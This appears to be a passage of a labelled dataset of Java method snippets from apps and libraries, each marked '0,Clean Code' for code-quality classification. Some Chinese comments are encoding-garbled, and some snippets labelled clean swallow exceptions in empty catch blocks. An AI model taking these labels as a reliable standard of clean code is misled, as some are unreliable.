    kAMIFJJEHJO=other.kAMIFJJEHJO;
    aCEOIOACIJO=other.aCEOIOACIJO;
    dADJOGHHEDE=other.dADJOGHHEDE;
  }
  return this;
}",0,Clean Code
"@Override public void componentResized(final ComponentEvent event){
  updateVisibleLinesAndColumns();
  updateCharacterBufferFromModel();
  setScrollBarMaximum();
}
",0,Clean Code
"@Specialization protected VmList eval(VmList self,VmClass clazz){
  var builder=self.builder();
  for (  var elem : self) {
    if (isInstanceOfNode.executeBoolean(elem,clazz)) {
      builder.add(elem);
    }
  }
  LoopNode.reportLoopCount(this,self.getLength());
  return builder.build();
}
@Specialization protected VmSet eval(VmSet self,VmClass clazz){
  var builder=self.builder();
  for (  var elem : self) {
    if (isInstanceOfNode.executeBoolean(elem,clazz)) {
      builder.add(elem);
    }
  }
  LoopNode.reportLoopCount(this,self.getLength());
  return builder.build();
}
",0,Clean Code
"/** 
 * 鑷姩鏇存柊Token鏂规硶 閫氳繃api/auth/login鎷垮埌session_token 鏇存崲tokens.json閲屽瓨鍌ㄧ殑Token 璐﹀彿涓簍oken.getUserName() 瀵嗙爜涓簍oken.getUserPassword()
 */
public String updateSessionToken(token token){
  String url;
  systemSetting systemSetting=systemService.selectSetting();
  if (systemSetting.getAutoToken_url().equals(""default"")) {
    String bingUrl=systemSetting.getBing();
    String[] parts=bingUrl.split("":"");
    url=""http://127.0.0.1"" + "":"" + parts[1] + ""/""+ systemSetting.getProxy_api_prefix()+ sessionToken;
  }
 else {
    url=systemSetting.getAutoToken_url() + sessionToken;
  }
  log.info(""灏嗛氳繃杩欎釜缃戝潃璇锋眰鐧诲綍淇℃伅锛"" + url);
  try {
    RequestBody requestBody=new MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart(""username"",token.getUsername()).addFormDataPart(""password"",token.getUserPassword()).build();
    Request request=new Request.Builder().url(url).post(requestBody).addHeader(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"").build();
    try (Response response=client.newCall(request).execute()){
      if (!response.isSuccessful()) {
        log.info(""Request failed: "" + response.body().string().trim());
        return null;
      }
      String responseContent=response.body().string();
      String resToken=null;
      try {
        JSONObject jsonResponse=new JSONObject(responseContent);
        resToken=jsonResponse.getString(""session_token"");
      }
 catch (      JSONException e) {
        e.printStackTrace();
      }
      if (response.code() == 200 && resToken != null && resToken.startsWith(""eyJhb"")) {
        return resToken;
      }
    }
 catch (    Exception e) {
      e.printStackTrace();
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
  return null;
}",0,Clean Code
"protected ListingOrMappingTypeNode(SourceSection sourceSection,@Nullable TypeNode keyTypeNode,TypeNode valueTypeNode){
  super(sourceSection);
  this.keyTypeNode=keyTypeNode;
  this.valueTypeNode=valueTypeNode;
  skipKeyTypeChecks=keyTypeNode == null || keyTypeNode.isNoopTypeCheck();
  skipValueTypeChecks=valueTypeNode.isNoopTypeCheck();
}
",0,Clean Code
"@Override public void sendSelectedItems(boolean notify,int scheduleDate){
  if (selectedAudios.size() == 0 || delegate == null || sendPressed) {
    return;
  }
  sendPressed=true;
  ArrayList<MessageObject> audios=new ArrayList<>();
  for (int a=0; a < selectedAudiosOrder.size(); a++) {
    audios.add(selectedAudiosOrder.get(a).messageObject);
  }
  delegate.didSelectAudio(audios,parentAlert.commentTextView.getText(),notify,scheduleDate);
}",0,Clean Code
"@Override public FlowDataDealRecord getMainByRecordIdAndFlowId(Long recordId,Long flowId){
  return lambdaQuery().eq(FlowDataDealRecord::getRecordId,recordId).eq(FlowDataDealRecord::getFlowId,flowId).eq(FlowDataDealRecord::getIsMain,true).orderByDesc(FlowDataDealRecord::getCreateTime).one();
}
",0,Clean Code
"@Override public J visitIdentifier(J.Identifier ident,ExecutionContext ctx){
  JavaType.Variable varType=ident.getFieldType();
  if (varType != null && TypeUtils.isOfClassType(varType.getOwner(),oldClassName) && varType.getName().equals(oldFieldName)) {
    return useNewMethod(ident);
  }
  return ident;
}
",0,Clean Code
"public void exitDefaultValue(boolean skipIfUnknownOptional){
  boolean isOptionalColumn=optionalColumn.get() != null;
  if (!converted && (isOptionalColumn || !skipIfUnknownOptional)) {
    if (isOptionalColumn) {
      columnEditor.optional(optionalColumn.get().booleanValue());
    }
    converted=true;
  }
}
",0,Clean Code
"private void checkDirectory(File rootDir){
  File[] files=rootDir.listFiles();
  if (files != null) {
    for (int a=0; a < files.length; a++) {
      File file=files[a];
      if (file.isDirectory() && file.getName().equals(""Telegram"")) {
        checkDirectory(file);
        continue;
      }
      ListItem item=new ListItem();
      item.title=file.getName();
      item.file=file;
      String fname=file.getName();
      String[] sp=fname.split(""\\."");
      item.ext=sp.length > 1 ? sp[sp.length - 1] : ""?"";
      item.subtitle=AndroidUtilities.formatFileSize(file.length());
      fname=fname.toLowerCase();
      if (fname.endsWith("".jpg"") || fname.endsWith("".png"") || fname.endsWith("".gif"")|| fname.endsWith("".jpeg"")) {
        item.thumb=file.getAbsolutePath();
      }
      listAdapter.recentItems.add(item);
    }
  }
}",0,Clean Code
"@Override public MethodVisitor visitMethod(int access,String name,String desc,String signature,String[] exceptions){
  MethodVisitor mv=super.visitMethod(access,name,desc,signature,exceptions);
  if (!fromAndroidSDK && TypeUtil.isSynthetic(access) && TypeUtil.isStatic(access)&& name.startsWith(""access$"")) {
    Access$MethodEntity access$MethodEntity=new Access$MethodEntity(className,name,desc);
    return new RefineAccess$MethodVisitor(mv,context,access$MethodEntity,access,name,desc,signature,exceptions);
  }
  return mv;
}
",0,Clean Code
"public boolean validate(UniversalRecyclerView listView){
  if (!exclude && alwaysShow.isEmpty() && includeFlags == 0) {
    BotWebViewVibrationEffect.APP_ERROR.vibrate();
    AndroidUtilities.shakeViewSpring(listView.findViewByItemId(BUTTON_ADD_INCLUDED),shiftDp=-shiftDp);
    listView.smoothScrollToPosition(listView.findPositionByItemId(BUTTON_ADD_INCLUDED));
    return false;
  }
  return true;
}",0,Clean Code
"@Inject public TaskStatusPublisher(RestClientManager rcm,ExecutionDAOFacade executionDAOFacade,List<String> subscribedTaskStatuses){
  this.rcm=rcm;
  this.executionDAOFacade=executionDAOFacade;
  this.subscribedTaskStatusList=subscribedTaskStatuses;
  validateSubscribedTaskStatuses(subscribedTaskStatuses);
  ConsumerThread consumerThread=new ConsumerThread();
  consumerThread.start();
}
",0,Clean Code
"/** 
 * Indicates the end of an object member value in the JSON input. This method will be called after reading the last character of the member value, just after the <code>end</code> method for the specific member type (like  {@link #endString(String) endString()},  {@link #endNumber(String) endNumber()}, etc.).
 * @param object the object handler returned from {@link #startObject()}, or null if not provided
 * @param name the parsed member name
 */
public void endObjectValue(@Nullable O object,String name){
}
",0,Clean Code
"public Builder readTimeout(Duration readTimeout){
  if (readTimeout == null) {
    throw new IllegalArgumentException(""readTimeout cannot be null"");
  }
 else {
    this.readTimeout=readTimeout;
    return this;
  }
}
",0,Clean Code
"@Override public List<PathElement> listElements(SecurityManager securityManager,URI baseUri) throws SecurityManagerException {
  securityManager.checkResolveResource(baseUri);
  var context=VmContext.get(null);
  var ret=new ArrayList<PathElement>();
  for (  var envVarName : context.getEnvironmentVariables().keySet()) {
    ret.add(PathElement.opaque(envVarName));
  }
  return ret;
}
@Override public List<PathElement> listElements(SecurityManager securityManager,URI baseUri) throws SecurityManagerException {
  securityManager.checkResolveResource(baseUri);
  var context=VmContext.get(null);
  var ret=new ArrayList<PathElement>();
  for (  var propName : context.getExternalProperties().keySet()) {
    ret.add(PathElement.opaque(propName));
  }
  return ret;
}
@Override public List<PathElement> listElements(SecurityManager securityManager,URI baseUri) throws IOException, SecurityManagerException {
  securityManager.checkResolveResource(baseUri);
  return FileResolver.listElements(baseUri);
}
@Override public List<PathElement> listElements(SecurityManager securityManager,URI baseUri) throws IOException, SecurityManagerException {
  securityManager.checkResolveResource(baseUri);
  var packageAssetUri=PackageAssetUri.create(baseUri);
  return getPackageResolver().listElements(packageAssetUri,packageAssetUri.getPackageUri().getChecksums());
}
@Override public List<PathElement> listElements(SecurityManager securityManager,URI baseUri) throws IOException, SecurityManagerException {
  securityManager.checkResolveResource(baseUri);
  var packageAssetUri=PackageAssetUri.create(baseUri);
  var dependency=getProjectDepsResolver().getResolvedDependency(packageAssetUri.getPackageUri());
  var path=getLocalPath(dependency,packageAssetUri);
  if (path != null) {
    return FileResolver.listElements(path);
  }
  var remoteDep=(Dependency.RemoteDependency)dependency;
  return getPackageResolver().listElements(PackageAssetUri.create(baseUri),remoteDep.getChecksums());
}
",0,Clean Code
"public int trackEvent(MotionEvent motionEvent){
  int trackedPointerIndex=motionEvent.findPointerIndex(mTrackedPointerId);
  int pointerCount=motionEvent.getPointerCount();
  if (trackedPointerIndex == -1 || mPointerCount != pointerCount || mColdStart) {
    startTracking(motionEvent);
    trackedPointerIndex=0;
  }
  float trackedX=motionEvent.getX(trackedPointerIndex);
  float trackedY=motionEvent.getY(trackedPointerIndex);
  mMotionVector[0]=trackedX - mLastX;
  mMotionVector[1]=trackedY - mLastY;
  mLastX=trackedX;
  mLastY=trackedY;
  return trackedPointerIndex;
}",0,Clean Code
"public long getMinimumHierarchicLayerDistance(){
  return hierarchicalLayoutMinLayerDistance;
}
",0,Clean Code
"@Override public boolean onControllerTouchEvent(MotionEvent ev){
  mSwipeDetector.onTouchEvent(ev);
  if (ev.getAction() == MotionEvent.ACTION_UP && mSwipeDetector.isIdleState() && !isOpeningAnimationRunning()) {
    if (!isEventOverContent(ev)) {
      close(true);
    }
  }
  return true;
}
",0,Clean Code
"public static TL_stories.StoryItem checkExpiredStateLocal(int currentAccount,long dialogId,TL_stories.StoryItem storyItem){
  if (storyItem instanceof TL_stories.TL_storyItemDeleted) {
    return storyItem;
  }
  int currentTime=ConnectionsManager.getInstance(currentAccount).getCurrentTime();
  boolean expired=false;
  if (storyItem.expire_date > 0) {
    expired=currentTime > storyItem.expire_date;
  }
 else {
    expired=currentTime - storyItem.date > EXPIRE_AFTER;
  }
  if (!storyItem.pinned && expired && dialogId != 0 && dialogId != UserConfig.getInstance(currentAccount).clientUserId) {
    TL_stories.TL_storyItemDeleted storyItemDeleted=new TL_stories.TL_storyItemDeleted();
    storyItemDeleted.id=storyItem.id;
    return storyItemDeleted;
  }
  return storyItem;
}",0,Clean Code
"/** 
 * <code>optional uint32 unique_id = 9;</code>
 * @return this
 */
public RogueCommonPendingAction clearUniqueId(){
  bitField0_&=~0x00000001;
  uniqueId=0;
  return this;
}",0,Clean Code
"public ThanosEffect getChatThanosEffect(){
  if (!LiteMode.isEnabled(LiteMode.FLAG_CHAT_THANOS) || !ThanosEffect.supports()) {
    return null;
  }
  if (chatListThanosEffect == null) {
    if (getContext() == null || !ThanosEffect.supports() || chatListView == null || contentView == null) {
      return null;
    }
    chatListThanosEffect=new ThanosEffect(getContext(),() -> {
      if (removingFromParent) {
        return;
      }
      ThanosEffect thisThanosEffect=chatListThanosEffect;
      if (thisThanosEffect != null) {
        chatListThanosEffect=null;
        contentView.removeView(thisThanosEffect);
      }
    }
);
    contentView.addView(chatListThanosEffect,1 + contentView.indexOfChild(chatListView),LayoutHelper.createFrame(LayoutHelper.MATCH_PARENT,LayoutHelper.MATCH_PARENT));
  }
  return chatListThanosEffect;
}",0,Clean Code
"private static void downloadCodeStyleFile(Project project,CodeStyleInfo codeStyleInfo){
  final File downloadFile=new File(FileUtils.sCodeLocatorMainDirPath,codeStyleInfo.fileName + "".xml"");
  if (downloadFile.exists() && codeStyleInfo.md5 != null && codeStyleInfo.md5.equals(MD5Utils.getMD5(downloadFile))) {
    setProjectCodeStyle(project,codeStyleInfo,downloadFile);
    return;
  }
  if (downloadFile.exists()) {
    downloadFile.delete();
  }
  AutoUpdateUtils.downloadUrlToFile(codeStyleInfo.fileAddr,downloadFile.getParent(),downloadFile.getName() + "".tmp"",new AutoUpdateUtils.OnDownloadListener(){
    @Override public void onDownloadSuccess(    File file,    long total){
      file.renameTo(downloadFile);
      if (downloadFile.exists()) {
        setProjectCodeStyle(project,codeStyleInfo,downloadFile);
      }
    }
    @Override public void onDownloadFailed(    Exception e){
      Log.e(""download code style failed"",e);
    }
  }
);
}",0,Clean Code
"/** 
 * <code>optional .RogueRecordInfo record_info = 5;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableRecordInfo()} if you want to modify it.
 * @return internal storage object for reading
 */
public RogueRecordInfoOuterClass.RogueRecordInfo getRecordInfo(){
  return recordInfo;
}",0,Clean Code
"/** 
 * <code>optional uint32 roll_buff_max_times = 10;</code>
 * @param value the rollBuffMaxTimes to set
 * @return this
 */
public RogueBuffSelectInfo setRollBuffMaxTimes(final int value){
  bitField0_|=0x00000008;
  rollBuffMaxTimes=value;
  return this;
}",0,Clean Code
"/** 
 * <code>optional .RotateMapCsReq.Vector4 vector4 = 10;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public Vector4 getMutableVector4(){
  bitField0_|=0x00000002;
  return vector4;
}",0,Clean Code
"public void close(){
  if (this != null) {
    Connection connection=this.getConnection();
    try {
      if (connection != null && !connection.isClosed()) {
        connection.close();
      }
    }
 catch (    SQLException e) {
    }
    com.jcraft.jsch.Session session=this.getSession();
    if (session != null && session.isConnected() && this.getSsh() != null && this.getSsh().isUse()) {
      try {
        session.delPortForwardingL(Integer.parseInt(this.getSsh().getLocalPort()));
      }
 catch (      JSchException e) {
      }
    }
  }
}
",0,Clean Code
"/** 
 * 鏂板璧勬簮瀵艰埅
 * @param resourceNavigateDTO
 * @param currentUser
 * @return
 */
@Override public Boolean create(ResourceNavigateDTO resourceNavigateDTO,UserSsoDTO currentUser){
  if (StringUtils.isBlank(resourceNavigateDTO.getResourceName()) || StringUtils.isBlank(resourceNavigateDTO.getCategory()) || StringUtils.isBlank(resourceNavigateDTO.getDesc())|| StringUtils.isBlank(resourceNavigateDTO.getLink())) {
    throw BusinessException.build(ResponseCode.NOT_EXISTS,""鍙傛暟涓嶅悎瑙�"");
  }
  if (isNameExist(null,resourceNavigateDTO.getResourceName())) {
    throw BusinessException.build(ResponseCode.NAME_EXIST,""璧勬簮瀵艰埅鍚嶉噸澶�"");
  }
  resourceNavigateDTO.setIsDeleted(false);
  resourceNavigateDTO.setCreateUser(currentUser.getUserId());
  resourceNavigateDTO.setUpdateUser(currentUser.getUserId());
  LocalDateTime now=LocalDateTime.now();
  resourceNavigateDTO.setCreateTime(now);
  resourceNavigateDTO.setUpdateTime(now);
  ResourceNavigatePo resourceNavigatePo=ResourceNavigateMS.INSTANCE.toPo(resourceNavigateDTO);
  if (resourceNavigatePoMapper.insertSelective(resourceNavigatePo) <= 0) {
    throw BusinessException.build(ResponseCode.OPERATE_FAIL,""鏂板璧勬簮瀵艰埅澶辫触"");
  }
  return true;
}",0,Clean Code
"@PostMapping(value={""/api/test/suggestion/provide""},produces=MediaType.APPLICATION_JSON_VALUE) public Result saveGPTSuggestion(@CurrentSecurityContext SysUser requestor,@RequestParam(value=""id"",defaultValue="""") String id,@RequestParam(value=""suggestion"",defaultValue="""") String suggestion,@RequestParam(value=""type"",defaultValue="""") String type){
  if (requestor == null) {
    return Result.error(HttpStatus.UNAUTHORIZED.value(),""unauthorized"");
  }
  if (StringUtils.isEmpty(id) || StringUtils.isEmpty(suggestion) || StringUtils.isEmpty(type)) {
    return Result.error(HttpStatus.BAD_REQUEST.value(),""Error param! Should not be empty"");
  }
  TestDataService.SuggestionType suggestionType;
  try {
    suggestionType=TestDataService.SuggestionType.valueOf(type);
  }
 catch (  IllegalArgumentException e) {
    return Result.error(HttpStatus.BAD_REQUEST.value(),""Error param! Suggestion type not exist"");
  }
  try {
    saveGPTSuggestion(id,suggestion,suggestionType);
  }
 catch (  HydraLabRuntimeException e) {
    return Result.error(e.getCode(),e.getMessage());
  }
  return Result.ok(""Save suggestion success!"");
}
!org.eclipse.jdt.core.dom.MethodDeclaration@18fb7e4",0,Clean Code
"@ParameterizedTest(name=""{0} : {displayName} "") @ValueSource(strings={""COSINE"",""L2"",""IP""}) public void documentUpdate(String metricType){
  contextRunner.withPropertyValues(""test.spring.ai.vectorstore.milvus.metricType="" + metricType).run(context -> {
    VectorStore vectorStore=context.getBean(VectorStore.class);
    resetCollection(vectorStore);
    Document document=new Document(UUID.randomUUID().toString(),""Spring AI rocks!!"",Collections.singletonMap(""meta1"",""meta1""));
    vectorStore.add(List.of(document));
    List<Document> results=vectorStore.similaritySearch(SearchRequest.query(""Spring"").withTopK(5));
    assertThat(results).hasSize(1);
    Document resultDoc=results.get(0);
    assertThat(resultDoc.getId()).isEqualTo(document.getId());
    assertThat(resultDoc.getContent()).isEqualTo(""Spring AI rocks!!"");
    assertThat(resultDoc.getMetadata()).containsKey(""meta1"");
    assertThat(resultDoc.getMetadata()).containsKey(""distance"");
    Document sameIdDocument=new Document(document.getId(),""The World is Big and Salvation Lurks Around the Corner"",Collections.singletonMap(""meta2"",""meta2""));
    vectorStore.add(List.of(sameIdDocument));
    results=vectorStore.similaritySearch(SearchRequest.query(""FooBar"").withTopK(5));
    assertThat(results).hasSize(1);
    resultDoc=results.get(0);
    assertThat(resultDoc.getId()).isEqualTo(document.getId());
    assertThat(resultDoc.getContent()).isEqualTo(""The World is Big and Salvation Lurks Around the Corner"");
    assertThat(resultDoc.getMetadata()).containsKey(""meta2"");
    assertThat(resultDoc.getMetadata()).containsKey(""distance"");
    vectorStore.delete(List.of(document.getId()));
  }
);
}",0,Clean Code
"public void moveLegend(float offset){
  if (chartData == null || selectedIndex == -1 || !legendShowing)   return;
  legendSignatureView.setData(selectedIndex,chartData.x[selectedIndex],(ArrayList<LineViewData>)lines,false);
  legendSignatureView.setVisibility(VISIBLE);
  legendSignatureView.measure(MeasureSpec.makeMeasureSpec(getMeasuredWidth(),MeasureSpec.AT_MOST),MeasureSpec.makeMeasureSpec(getMeasuredHeight(),MeasureSpec.AT_MOST));
  float lXPoint=chartData.xPercentage[selectedIndex] * chartFullWidth - offset;
  if (lXPoint > (chartStart + chartWidth) / 2f) {
    lXPoint-=(legendSignatureView.getWidth() + DP_5);
  }
 else {
    lXPoint+=DP_5;
  }
  if (lXPoint < 0) {
    lXPoint=0;
  }
 else   if (lXPoint + legendSignatureView.getMeasuredWidth() > getMeasuredWidth()) {
    lXPoint=getMeasuredWidth() - legendSignatureView.getMeasuredWidth();
  }
  legendSignatureView.setTranslationX(lXPoint);
}
public void moveLegend(){
  moveLegend(chartFullWidth * (pickerDelegate.pickerStart) - HORIZONTAL_PADDING);
}",0,Clean Code
"/** 
 * <code>optional .LineupInfo lineup = 7;</code>
 * @return this
 */
public ChessRogueInfo clearLineup(){
  bitField0_&=~0x00000002;
  lineup.clear();
  return this;
}",0,Clean Code
"public List<Expression> expressions(){
  return expressions;
}
",0,Clean Code
"public void freeZyLibVisibilityListeners(){
  for (  final InternalGraphVisibilityListener listener : savedVisibilityListeners) {
    if (listener == null) {
      continue;
    }
    listener.getGraph().addListener(listener);
  }
}
",0,Clean Code
"@AfterAll public static void afterAll(){
  evaluator.close();
}
",0,Clean Code
"protected void setFiatBalance(FiatLabel fiatLabel,CurrencyRate currencyRate,long balance){
  if (currencyRate != null && currencyRate.isAvailable() && balance > 0) {
    fiatLabel.set(currencyRate,balance);
  }
 else {
    fiatLabel.setCurrency(null);
    fiatLabel.setBtcRate(0.0);
  }
}",0,Clean Code
"@Override public SyncRogueBuffSelectInfoScNotify create(){
  return SyncRogueBuffSelectInfoScNotify.newInstance();
}
",0,Clean Code
"private static void taskFinish(String taskId,String taskType){
  try {
    String s=AntBookReadRpcCall.taskFinish(taskId,taskType);
    JSONObject jo=new JSONObject(s);
    if (jo.getBoolean(""success"")) {
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""taskFinish err:"");
    Log.printStackTrace(TAG,t);
  }
}
",0,Clean Code
"/** 
 * @return cql query statement to retrieve all event executions for a given message and eventhandler from the ""event_executions"" table
 */
public String getSelectAllEventExecutionsForMessageFromEventExecutionsStatement(){
  return QueryBuilder.select().all().from(keyspace,TABLE_EVENT_EXECUTIONS).where(eq(MESSAGE_ID_KEY,bindMarker())).and(eq(EVENT_HANDLER_NAME_KEY,bindMarker())).getQueryString();
}
",0,Clean Code
"@Override public void onQueue(@Nullable Object message){
  if (mQueueNotificationManager == null || mQueueNotificationManagerInfo == null || message == null) {
    return;
  }
  NotificationInfo info=(NotificationInfo)message;
  Notification notification=info.getBuilder(mContext,mQueueNotificationManagerInfo).setLocalOnly(true).build();
  notify(mContext,mQueueNotificationManager,TAG_QUEUE,NotificationUtils.nextNotificationId(TAG_QUEUE),notification);
}
",0,Clean Code
"private <J2 extends J>JRightPadded<J2> minimumLines(JRightPadded<J2> tree,int min){
  return tree.withElement(minimumLines(tree.getElement(),min));
}
private <J2 extends J>J2 minimumLines(J2 tree,int min){
  return tree.withPrefix(minimumLines(tree.getPrefix(),min));
}
private Space minimumLines(Space prefix,int min){
  if (min == 0) {
    return prefix;
  }
  if (prefix.getComments().isEmpty() || prefix.getWhitespace().contains(""\n"") || prefix.getComments().get(0) instanceof Javadoc|| (prefix.getComments().get(0).isMultiline() && prefix.getComments().get(0).printComment(getCursor()).contains(""\n""))) {
    return prefix.withWhitespace(minimumLines(prefix.getWhitespace(),min));
  }
  return prefix.withComments(ListUtils.map(prefix.getComments(),(i,c) -> i == 0 ? c.withSuffix(minimumLines(c.getSuffix(),min)) : c));
}
public static String minimumLines(String whitespace,int min){
  if (min == 0) {
    return whitespace;
  }
  String minWhitespace=whitespace;
  for (int i=0; i < min - getNewLineCount(whitespace) + 1; i++) {
    minWhitespace=""\n"" + minWhitespace;
  }
  return minWhitespace;
}",0,Clean Code
"/** 
 * Returns the record canonical constructor. 
 */
public static Tuple2<Constructor,MethodHandle> getRecordConstructor(Class<?> cls){
  return ctrCache.get(cls);
}",0,Clean Code
"/** 
 * 璐拱杞︾エ
 * @param requestParam 杞︾エ璐拱璇锋眰鍙傛暟
 * @return 璁㈠崟鍙�
 */
TicketPurchaseRespDTO purchaseTicketsV1(@RequestBody PurchaseTicketReqDTO requestParam);",0,Clean Code
"@Test void should_retrieve_with_custom_dynamicMinScore_builder(){
  ContentRetriever contentRetriever=EmbeddingStoreContentRetriever.builder().embeddingStore(EMBEDDING_STORE).embeddingModel(EMBEDDING_MODEL).dynamicMinScore((query) -> CUSTOM_MIN_SCORE).build();
  contentRetriever.retrieve(QUERY);
  verify(EMBEDDING_STORE).search(EmbeddingSearchRequest.builder().queryEmbedding(EMBEDDING).maxResults(DEFAULT_MAX_RESULTS).minScore(CUSTOM_MIN_SCORE).build());
  verifyNoMoreInteractions(EMBEDDING_STORE);
}
",0,Clean Code
"/** 
 * <code>optional bool pool_refreshed = 13;</code>
 * @return this
 */
public RogueScoreRewardInfo clearPoolRefreshed(){
  bitField0_&=~0x00000020;
  poolRefreshed=false;
  return this;
}",0,Clean Code
"@ParameterizedTest @CsvSource({""0,false,false"",""90,false,false"",""180,false,false"",""270,false,false"",""0,true,false"",""0,false,true"",""0,true,true""}) void testOverlappingHoles(int degrees,boolean flipX,boolean flipY) throws GeometryException {
  MutableCoordinateSequence outer=new MutableCoordinateSequence();
  outer.addPoint(1,1);
  outer.addPoint(10,1);
  outer.addPoint(10,10);
  outer.addPoint(1,10);
  outer.closeRing();
  MutableCoordinateSequence inner1=new MutableCoordinateSequence();
  inner1.addPoint(2,2);
  inner1.addPoint(2,9);
  inner1.addPoint(9,9);
  inner1.addPoint(3,5);
  inner1.addPoint(9,2);
  inner1.closeRing();
  MutableCoordinateSequence inner2=new MutableCoordinateSequence();
  inner2.addPoint(9,3);
  inner2.addPoint(9,8);
  inner2.addPoint(4,5);
  inner2.closeRing();
  flipAndRotate(outer,6,6,flipX,flipY,degrees);
  flipAndRotate(inner1,6,6,flipX,flipY,degrees);
  flipAndRotate(inner2,6,6,flipX,flipY,degrees);
  testRender(List.of(List.of(outer,inner1)));
  testRender(List.of(List.of(outer,inner2)));
  testRender(List.of(List.of(outer,inner1,inner2)));
  var result=testRender(List.of(List.of(outer,inner2,inner1)));
  if (degrees == 0 && !flipX && !flipY) {
    assertFalse(result.getCoveredTiles().test(7,4));
    assertFalse(result.getCoveredTiles().test(3,3));
    assertTrue(result.getCoveredTiles().test(1,1));
    assertTrue(result.getCoveredTiles().test(9,9));
  }
}",0,Clean Code
"@Override protected void dispatchDraw(Canvas canvas){
  canvas.save();
  circlePath.rewind();
  circlePath.addCircle(getWidth() / 2f,getHeight() / 2f,Math.min(getWidth() / 2f,getHeight() / 2f),Path.Direction.CW);
  canvas.clipPath(circlePath);
  super.dispatchDraw(canvas);
  canvas.restore();
}
@Override protected void dispatchDraw(Canvas canvas){
  AndroidUtilities.rectTmp.set(cameraView.getX() + cameraView.getWidth() / 2f * (1f - cameraView.getScaleX()),cameraView.getY() + cameraView.getHeight() / 2f * (1f - cameraView.getScaleY()),cameraView.getX() + cameraView.getWidth() - cameraView.getWidth() / 2f * (1f - cameraView.getScaleX()),cameraView.getY() + cameraView.getHeight() - cameraView.getHeight() / 2f * (1f - cameraView.getScaleY()));
  shadowPaint.setShadowLayer(dp(2),0,dp(.66f),Theme.multAlpha(0x20000000,alpha));
  shadowPaint.setAlpha((int)(0xff * alpha));
  canvas.drawCircle(AndroidUtilities.rectTmp.centerX(),AndroidUtilities.rectTmp.centerY(),Math.min(AndroidUtilities.rectTmp.width() / 2f,AndroidUtilities.rectTmp.height() / 2f) - 1,shadowPaint);
  super.dispatchDraw(canvas);
  if (roundView != null && roundView.getWidth() > 0 && roundView.getHeight() > 0) {
    canvas.save();
    canvas.translate(AndroidUtilities.rectTmp.left,AndroidUtilities.rectTmp.top);
    canvas.scale(AndroidUtilities.rectTmp.width() / roundView.getWidth(),AndroidUtilities.rectTmp.height() / roundView.getHeight());
    float wasAlpha=roundView.getAlpha();
    roundView.setDraw(true);
    roundView.setAlpha(1f - alpha);
    roundView.draw(canvas);
    roundView.setAlpha(wasAlpha);
    roundView.setDraw(false);
    canvas.restore();
  }
  if (recordingStarted > 0) {
    float t=Utilities.clamp(sinceRecording() / (float)MAX_DURATION,1,0);
    progressPaint.setStrokeWidth(dp(3.33f));
    progressPaint.setColor(Theme.multAlpha(0xbeffffff,alpha));
    progressPaint.setShadowLayer(dp(1),0,dp(.33f),Theme.multAlpha(0x20000000,alpha));
    AndroidUtilities.rectTmp.inset(-dp(3.33f / 2f + 6),-dp(3.33f / 2f + 6));
    canvas.drawArc(AndroidUtilities.rectTmp,-90f,360f * t,false,progressPaint);
    if (recordingStopped <= 0)     invalidate();
  }
}",0,Clean Code
"public static FBSSample getRootAsFBSSample(ByteBuffer _bb){
  return getRootAsFBSSample(_bb,new FBSSample());
}
public static FBSSample getRootAsFBSSample(ByteBuffer _bb,FBSSample obj){
  _bb.order(ByteOrder.LITTLE_ENDIAN);
  return (obj.__assign(_bb.getInt(_bb.position()) + _bb.position(),_bb));
}
",0,Clean Code
"public MethodReference addMethodRef(SootMethodRef sootMethodRef){
  SootClass cls=sootMethodRef.getDeclaringClass();
  SootMethod method=SemanticUtils.getMethod(sootMethodRef);
  return addMethodRef(cls,method);
}
public MethodReference addMethodRef(SootClass cls,SootMethod method){
  MethodReference methodRef=null;
  ClassReference classRef=getClassRefByName(cls.getName());
  if (classRef == null) {
    ClassInfoCollector.collectRuntimeForSingleClazz(cls.getName(),true,this,null);
    methodRef=getMethodRefBySignature(method.getSignature(),true);
  }
 else   if (method != null && (""soot.dummy.InvokeDynamic"".equals(cls.getName()) || cls.getName().contains(""$lambda_"") || method.isNative())) {
    methodRef=ClassInfoCollector.collectSingleMethodRef(classRef,method,false,false,this,GlobalConfiguration.rulesContainer);
  }
 else   if (method != null) {
    methodRef=ClassInfoCollector.collectSingleMethodRef(classRef,method,true,true,this,GlobalConfiguration.rulesContainer);
  }
  return methodRef;
}
",0,Clean Code
"public GProBusinessInfo getBusinessInfo(){
  return this.businessInfo;
}
",0,Clean Code
"void onRecvMsg(ArrayList<MsgRecord> arrayList);
",0,Clean Code
"public static String toStringBinary(final byte[] b){
  if (b == null) {
    return ""null"";
  }
  return toStringBinary(b,0,b.length);
}
public static String toStringBinary(final byte[] b,int off,int len){
  StringBuilder result=new StringBuilder();
  String first=new String(b,off,len,StandardCharsets.ISO_8859_1);
  for (int i=0; i < first.length(); ++i) {
    int ch=first.charAt(i) & 0xFF;
    if ((ch >= '0' && ch <= '9') || (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z')|| "" `~!@#$%^&*()-_=+[]{}\\|;:'\"",.<>/?"".indexOf(ch) >= 0) {
      result.append(first.charAt(i));
    }
 else {
      result.append(String.format(""\\x%02X"",ch));
    }
  }
  return result.toString();
}",0,Clean Code
"public boolean isKeyTypeFinal(){
  return isKeyTypeFinal;
}
",0,Clean Code
"public void checkIsEligible(boolean force,Utilities.Callback<TL_smsjobs.TL_smsjobs_eligibleToJoin> whenDone){
  if (loadedIsEligible && !force || loadingIsEligible && whenDone == null)   return;
  loadingIsEligible=true;
  ConnectionsManager.getInstance(currentAccount).sendRequest(new TL_smsjobs.TL_smsjobs_isEligibleToJoin(),(res,err) -> AndroidUtilities.runOnUIThread(() -> {
    loadingIsEligible=false;
    loadedIsEligible=true;
    if (res instanceof TL_smsjobs.TL_smsjobs_eligibleToJoin) {
      isEligible=(TL_smsjobs.TL_smsjobs_eligibleToJoin)res;
    }
 else     if (err != null && ""NOT_ELIGIBLE"".equals(err.text)) {
      isEligible=null;
    }
 else     if (err != null && ""ALREADY_JOINED"".equals(err.text)) {
      isEligible=null;
    }
 else     if (err != null) {
